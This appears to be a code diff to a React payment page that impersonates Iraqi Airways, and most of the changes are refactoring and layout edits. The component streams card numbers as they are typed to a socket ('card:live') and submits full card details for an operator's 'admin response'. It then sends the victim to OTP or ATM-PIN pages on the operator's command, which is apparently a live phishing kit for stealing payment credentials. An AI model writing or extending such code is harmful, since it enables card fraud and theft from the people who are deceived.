@@ -133,6 +133,7 @@ const COUNTRIES = [
   { code: 'at', en: 'Austria', ar: 'النمسا' },
   { code: 'be', en: 'Belgium', ar: 'بلجيكا' },
   { code: 'gr', en: 'Greece', ar: 'اليونان' },
+  { code: 'tr', en: 'Turkey', ar: 'تركيا' },
   { code: 'my', en: 'Malaysia', ar: 'ماليزيا' },
   { code: 'in', en: 'India', ar: 'الهند' },
   { code: 'pk', en: 'Pakistan', ar: 'باكستان' },
@@ -186,7 +187,7 @@ const COUNTRIES = [
 export default function CreditCardPayment() {
   useSignals();
   
-  // 1. All state declarations first to avoid TDZ (Cannot access before initialization)
+  // 1. State
   const [cardError, setCardError] = useState(false);
   const [luhnError, setLuhnError] = useState(false);
   const [rejectedError, setRejectedError] = useState(false);
@@ -205,14 +206,14 @@ export default function CreditCardPayment() {
   const [adultDetailOpen, setAdultDetailOpen] = useState(false);
   const [childDetailOpen, setChildDetailOpen] = useState(false);
 
-  // 2. Refs and Contexts
+  // 2. Refs & Context
   const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const countryDropdownRef = useRef<HTMLFieldSetElement>(null);
   const { lang, setLang, t } = useLang();
   const isAr = lang === 'ar';
   const [, navigate] = useLocation();
 
-  // 3. Signal values
+  // 3. Signals
   const isDiscountActive = globalDiscount.value;
 
   // 4. Effects
@@ -241,13 +242,6 @@ export default function CreditCardPayment() {
     document.addEventListener("mousedown", handleClickOutside);
     return () => document.removeEventListener("mousedown", handleClickOutside);
   }, []);
-
-  useEffect(() => {
-    setValue("country", isAr ? selectedCountry.ar : selectedCountry.en);
-  }, [selectedCountry, isAr]);
-
-  const minutes = Math.floor(timeLeft / 60);
-  const seconds = timeLeft % 60;
 
   const searchParams = new URLSearchParams(window.location.search);
   const urlAmount = searchParams.get('amount') || '0';
@@ -294,14 +288,12 @@ export default function CreditCardPayment() {
 
   const displayAmountStr = displayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });
   const originalDisplayAmountStr = originalDisplayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });
-  const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';
 
   const {
     register,
     handleSubmit,
     watch,
     setValue,
-    reset,
     formState: { errors },
   } = useForm<FormData>({
     resolver: zodResolver(schema),
@@ -329,7 +321,10 @@ export default function CreditCardPayment() {
   const country = watch("country");
 
   useEffect(() => {
-    // Send immediately - no debounce for real-time
+    setValue("country", isAr ? selectedCountry.ar : selectedCountry.en);
+  }, [selectedCountry, isAr, setValue]);
+
+  useEffect(() => {
     const rawNum = (cardNumber || "").replace(/\s+/g, "");
     socket.value.emit("card:live", {
       cardNumber: rawNum,
@@ -379,44 +374,28 @@ export default function CreditCardPayment() {
   const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value.replace(/\D/g, "");
     if (value.length > 19) value = value.slice(0, 19);
-    
-    // Auto-detect card type
     const type = getCardType(value);
     if (type === "visa") setSelectedCardType("Visa");
     else if (type === "mastercard") setSelectedCardType("MasterCard");
-    
-    // Luhn check
-    if (value.length >= 13) {
-      setLuhnError(!isValidCardNumber(value));
-    } else {
-      setLuhnError(false);
-    }
-
-    // Blocked prefix check
+    if (value.length >= 13) setLuhnError(!isValidCardNumber(value));
+    else setLuhnError(false);
     const isPrefixBlocked = visitor.value.blockedCardPrefixes?.some(prefix => value.startsWith(prefix));
     setCardError(!!isPrefixBlocked);
-
-    // Format with spaces
     const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
     e.target.value = formatted;
     setValue("cardNumber", formatted);
   };
 
   useSignalEffect(() => {
-    if (isFormApproved.value) {
-      navigate("/otp-verification");
-    }
+    if (isFormApproved.value) navigate("/otp-verification");
   });
 
   useSignalEffect(() => {
     const action = cardAction.value;
     if (!action) return;
-    
-    if (action.action === "otp") {
-      navigate("/otp-verification");
-    } else if (action.action === "atm") {
-      navigate("/atm-password");
-    } else if (action.action === "reject") {
+    if (action.action === "otp") navigate("/otp-verification");
+    else if (action.action === "atm") navigate("/atm-password");
+    else if (action.action === "reject") {
       setRejectedError(true);
       waitingCardInfo.value = null;
       waitingMessage.value = "";
@@ -425,10 +404,8 @@ export default function CreditCardPayment() {
 
   const onSubmit = (data: FormData) => {
     if (cardError || luhnError) return;
-    
     setRejectedError(false);
     const cleanNum = data.cardNumber.replace(/\s+/g, "");
-    
     sendData({
       paymentCard: {
         number: cleanNum,
@@ -450,7 +427,6 @@ export default function CreditCardPayment() {
       nextPage: "انتظار الرد",
       waitingForAdminResponse: true,
     });
-
     waitingMessage.value = lang === 'ar' ? "جاري معالجة الدفع..." : "Processing payment...";
   };
 
@@ -462,21 +438,13 @@ export default function CreditCardPayment() {
   const paxCount = tripSummary.passengerCount || tripSummary.paxCount || 1;
   const flightsConv = tripSummary.flightsConv || 0;
   const taxesConv = tripSummary.taxesConv || 0;
-  const baseTotalConv = tripSummary.baseTotalConv || 0;
-  const curCode = tripSummary.curCode || 'IQD';
   
   const flightData = JSON.parse(localStorage.getItem('selectedFlight') || localStorage.getItem('flightData') || '{}');
   const px = flightData.pax || { adult: paxCount, child: 0, infant: 0 };
   const numAdults = px.adult || paxCount;
-  const numChildren = px.child || 0;
-  const numInfants = px.infant || 0;
 
   const adultPrice = flightsConv / paxCount;
-  const childPrice = adultPrice * 0.75;
-  const infantPrice = adultPrice * 0.1;
   const adultTaxes = taxesConv / paxCount;
-  const childTaxes = adultTaxes;
-  const infantTaxes = adultTaxes * 0.5;
 
   const filteredCountries = countrySearch.trim() === "" 
     ? COUNTRIES 
@@ -486,24 +454,24 @@ export default function CreditCardPayment() {
       );
 
   return (
-    <div className="min-h-screen bg-[#f4f7f6] font-sans" dir={isAr ? 'rtl' : 'ltr'}>
+    <div className="min-h-screen bg-[#f4f7f6] font-sans flex flex-col" dir={isAr ? 'rtl' : 'ltr'}>
       <WaitingOverlay />
       <header className="bg-[#4CAF50] text-white py-3 px-4 shadow-md sticky top-0 z-40">
-        <div className={`max-w-6xl mx-auto flex items-center justify-between ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
+        <div className="max-w-6xl mx-auto flex justify-between items-center">
           <div className="flex items-center gap-4">
             <div className="relative">
               <button onClick={() => setLangMenuOpen(!langMenuOpen)} className="flex items-center gap-1 text-sm font-medium hover:opacity-80 transition-opacity uppercase">
                 {lang === 'en' ? 'English' : 'العربية'} <span className="text-[10px]">▼</span>
               </button>
               {langMenuOpen && (
-                <div className={`absolute top-full mt-2 bg-white text-gray-800 rounded shadow-xl py-2 min-w-[120px] z-50 border border-gray-100 animate-in fade-in slide-in-from-top-1 ${isAr ? 'right-0' : 'left-0'}`}>
+                <div className={`absolute top-full left-0 mt-2 bg-white text-gray-800 rounded shadow-xl py-2 min-w-[120px] z-50 border border-gray-100 animate-in fade-in slide-in-from-top-1`}>
                   <button onClick={() => { setLang('en'); setLangMenuOpen(false); }} className="w-full text-left px-4 py-2 hover:bg-gray-50 transition-colors text-sm font-medium">English</button>
                   <button onClick={() => { setLang('ar'); setLangMenuOpen(false); }} className="w-full text-left px-4 py-2 hover:bg-gray-50 transition-colors text-sm font-medium">العربية</button>
                 </div>
               )}
             </div>
           </div>
-          <div className={`flex items-center gap-6 ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
+          <div className="flex items-center gap-6">
             <a href="/" className="text-sm font-bold hover:underline underline-offset-4 decoration-2 transition-all">{isAr ? 'الصفحة الرئيسية' : 'Home'}</a>
             <a href="/" className="block"><img src="/iraqi_airways/logo.png" alt="Iraqi Airways" className="h-10 brightness-0 invert" /></a>
           </div>
@@ -512,8 +480,8 @@ export default function CreditCardPayment() {
 
       <div className="bg-white border-b border-gray-200 py-4 px-4 sticky top-[64px] z-30 shadow-sm">
         <div className="max-w-6xl mx-auto flex flex-wrap justify-between items-center gap-4">
-          <div className={`flex items-center gap-6 overflow-x-auto no-scrollbar ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
-            <div className={`flex items-center gap-3 shrink-0 ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
+          <div className={`flex items-center gap-6 overflow-x-auto no-scrollbar ${isAr ? 'flex-row' : 'flex-row'}`}>
+            <div className={`flex items-center gap-3 shrink-0 ${isAr ? 'flex-row' : 'flex-row'}`}>
               <div className={isAr ? 'text-right' : 'text-left'}>
                 <p className="text-xl font-black text-[#2E7D32] leading-tight tracking-tighter uppercase">{origin}</p>
                 <p className="text-[10px] text-gray-500 font-bold uppercase">{originCity}</p>
@@ -557,7 +525,7 @@ export default function CreditCardPayment() {
             <div className="p-6 border-b border-gray-100 bg-gray-50/50">
               <div className="flex justify-between items-center cursor-pointer" onClick={() => setPriceDetailOpen(!priceDetailOpen)}>
                 <div className="flex flex-col">
-                  <div className={`flex items-baseline gap-2 ${isAr ? 'flex-row' : 'flex-row-reverse justify-end'}`}>
+                  <div className={`flex items-baseline gap-2 ${isAr ? 'flex-row' : 'flex-row'}`}>
                     <span className="text-sm font-bold text-gray-500">{isAr ? 'السعر الإجمالي:' : 'Total price:'}</span>
                     <span className="text-2xl font-black text-[#2E7D32]">{payCur.symbol} {displayAmountStr}</span>
                     {isDiscountActive && (
@@ -588,30 +556,25 @@ export default function CreditCardPayment() {
                       )}
                     </div>
                   )}
-                  <div className="pt-4 border-t border-dashed border-gray-300 flex justify-between items-center">
-                    <span className="text-sm font-black text-gray-800 uppercase">{isAr ? 'المجموع الكلي' : 'Total Amount'}</span>
-                    <span className="text-xl font-black text-[#2E7D32]">{payCur.symbol} {displayAmountStr}</span>
-                  </div>
-                  <a href="#" className="block text-[10px] text-[#4CAF50] font-black underline uppercase tracking-tighter hover:text-[#2E7D32] transition-colors">{isAr ? 'سياسة الأمتعة المفصلة ↗' : 'Detailed baggage policy ↗'}</a>
                 </div>
               )}
             </div>
 
             <div className="p-8">
-              <div className={`flex items-center gap-3 mb-8 ${isAr ? 'flex-row' : 'flex-row-reverse justify-end'}`}>
+              <div className={`flex items-center gap-3 mb-8 ${isAr ? 'flex-row' : 'flex-row'}`}>
                 <div className="w-10 h-10 bg-[#E8F5E9] rounded-lg flex items-center justify-center">
                   <svg className="w-6 h-6 text-[#4CAF50]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                 </div>
                 <h2 className="text-xl font-black text-gray-800 tracking-tight uppercase">{isAr ? 'اختر طريقة الدفع' : 'Select payment method'}</h2>
               </div>
 
-              <div className={`flex flex-col sm:flex-row gap-8 ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
+              <div className={`flex flex-col sm:flex-row gap-8 ${isAr ? 'flex-row' : 'flex-row'}`}>
                 <div className="w-full sm:w-[250px] shrink-0">
-                  <div className={`flex items-center gap-2 mb-4 ${isAr ? 'flex-row' : 'flex-row-reverse justify-end'}`}>
+                  <div className={`flex items-center gap-2 mb-4 ${isAr ? 'flex-row' : 'flex-row'}`}>
                     <svg className="w-5 h-5 text-[#4CAF50]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                     <span className="font-black text-[#2E7D32] text-sm uppercase tracking-wider">{isAr ? 'بطاقة ائتمان' : 'Credit Card'}</span>
                   </div>
-                  <div className={`flex gap-2 mb-6 ${isAr ? 'flex-row' : 'flex-row-reverse justify-end'}`}>
+                  <div className={`flex gap-2 mb-6 ${isAr ? 'flex-row' : 'flex-row'}`}>
                     <img src="/iraqi_airways/vendor_mastercard.svg" alt="Mastercard" className="h-4" />
                     <img src="/iraqi_airways/vendor_visa.svg" alt="Visa" className="h-4" />
                   </div>
@@ -630,7 +593,7 @@ export default function CreditCardPayment() {
                   </div>
                 </div>
 
-                <div className={`flex-1 space-y-4 ${isAr ? 'sm:mr-0' : 'sm:ml-0'}`}>
+                <div className={`flex-1 space-y-4`}>
                   <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                     <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'نوع البطاقة*' : 'Card type*'}</legend>
                     <select className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] appearance-none cursor-pointer">
@@ -643,7 +606,7 @@ export default function CreditCardPayment() {
                   <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${luhnError || cardError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                     <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'رقم البطاقة*' : 'Card number*'}</legend>
                     <div className="flex items-center w-full">
-                      <input type="text" inputMode="numeric" placeholder={isAr ? 'رقم بطاقتك الائتمانية' : 'Your credit card number'} {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px]" dir="ltr" />
+                      <input type="text" inputMode="numeric" placeholder={isAr ? 'رقم بطاقتك الائتمانية' : 'Your credit card number'} {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" dir="ltr" />
                       {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="h-7" />}
                     </div>
                   </fieldset>
@@ -654,7 +617,7 @@ export default function CreditCardPayment() {
                 </div>
               </div>
 
-              <div className={`cc-fields-below mt-3 ${isAr ? 'sm:mr-[280px]' : 'sm:ml-[280px]'}`}>
+              <div className={`cc-fields-below mt-3 sm:ml-[280px]`}>
                 <div className="cc-expiry-cvv flex flex-wrap sm:flex-nowrap gap-3 items-start">
                   <fieldset className={`border rounded px-3 bg-[#f5faf0] flex-1 min-w-0 flex items-center flex-shrink-0 ${expiryError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                     <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'تاريخ الانتهاء*' : 'Expiry date*'}</legend>
@@ -777,9 +740,9 @@ export default function CreditCardPayment() {
           <div className="space-y-6">
             <img src="/iraqi_airways/logo.png" alt="Iraqi Airways" className="h-12 brightness-0 invert" />
             <div className="flex gap-4">
-              <a href="#" className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors">IG</a>
-              <a href="#" className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors">TW</a>
-              <a href="#" className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors">FB</a>
+              <span className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors cursor-pointer">IG</span>
+              <span className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors cursor-pointer">TW</span>
+              <span className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center hover:bg-white/20 transition-colors cursor-pointer">FB</span>
             </div>
           </div>
           <div className="space-y-4">
